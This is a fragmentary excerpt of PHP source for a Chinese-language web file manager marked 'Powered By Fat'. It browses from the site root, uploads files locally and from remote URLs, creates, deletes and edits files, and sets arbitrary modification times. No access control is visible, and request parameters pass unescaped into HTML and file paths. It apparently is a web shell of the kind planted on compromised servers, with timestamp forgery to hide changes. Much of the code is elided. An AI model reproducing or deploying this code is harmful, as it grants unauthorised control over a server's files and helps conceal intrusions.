 ...
 $ROOT_DIR = File_Mode();
  if ($showtop) {
    echo "<tr><td><font size=\"2\">\n"
		...
		."<img src=pixel.gif width=7 height=1><a href=\"".$adminfile."?op=home&folder=".$ROOT_DIR."/\">网站根目录</a>\n"
        ."<img src=pixel.gif width=7 height=1><a href=\"".$adminfile."?op=home&folder=".$_GET['folder']."\">当前目录</a>\n"
        ."<img src=pixel.gif width=7 height=1><a href=\"".$adminfile."?op=up&folder=".$_GET['folder']."\" $iftop>上传</a>\n"
        ."<img src=pixel.gif width=7 height=1><a href=\"".$adminfile."?op=cr&folder=".$_GET['folder']."\" $iftop>创建</a>\n"
  ...
  while($stylesheet = readdir($style)) {
    ...
    if ($stylesheet[0] != "." && $stylesheet[0] != ".." ) {
      if (is_dir($folder.$stylesheet) && is_readable($folder.$stylesheet)) { 
        ...
        $content2[$b] ="<td><a href=\"".str_replace($ROOT_DIR,"",$folderx).$stylesheet."\">".$sstylesheet."</a></td>\n"
...
$updir=dirname($folder);
}
  echo "浏览目录: $folder\n <a href=\"?op=home&folder=".$updir."/\">上级目录</a>\n"
       ."<br>文件数: " . $count . "<br><br>";
...
maintop("远程上传");
echo "文件 ".$url." 上传成功."." <a href=\"".$adminfile."?op=home\">返回文件管理</a>\n";
mainbottom();
return true;
}
...
function upload($upfile, $ndir) {
  ...
  if (!$upfile) {
    ...
    if(copy($upfile['tmp_name'],$ndir.$upfile['name'])) { 
      maintop("上传");
      echo "文件 ".$ndir.$upfile_name.$upfile['name']." 上传成功.\n"." <a href=\"".$adminfile."?op=home&folder=".$ndir."\">返回文件管理</a>\n";
      mainbottom();
    } else {
...
function delete($dename) {
  ...
  if (!$dename == "") {
    ...
    if (is_dir($folder.$dename)) {
      ...
      rmdir($folder.$dename);
      echo $dename." 已经被删除."
    ." <a href=\"".$adminfile."?op=home&folder=".$folder."\">返回文件管理</a>\n";
    } else {
...
function edit($fename) {
  ...
  if (!$fename == "") {
   ...
   $contents = "";
    ...
    fclose ($handle);
	$FILE_TIME = date('Y-m-d H:i:s',filemtime($folder.$fename));
    $replace1 = "</text";
    $replace2 = "area>";
    $replace3 = "< / text";
    $replace4 = "area>";
    ...
    echo "< / textarea>\n"
		...
		."文件修改时间 <input type=\"text\" name=\"time\" id=\"mtime\" value=\"{$FILE_TIME}\" style=\"width:150px;\">"
        ."</form>\n";
    mainbottom();
  } else {
    home();
...
/****************************************************************/
function save($ncontent, $fename, $time) {
  global $folder;
  if (!$fename == "") {
    maintop("编辑");
    $loc = $folder.$fename;
...
function mainbottom() {
  echo "</table></table>\n"
      ."<table width=100%><tr><td align=right><font class=copyright>Powered By Fat</font></table>\n"
      ."</table></table></body>\n"
      ."</html>\n";
  exit;
}
...
switch($op) {
    ...
    case "save":
	save($_REQUEST['ncontent'], $_REQUEST['fename'],$_POST['time']);
	break;
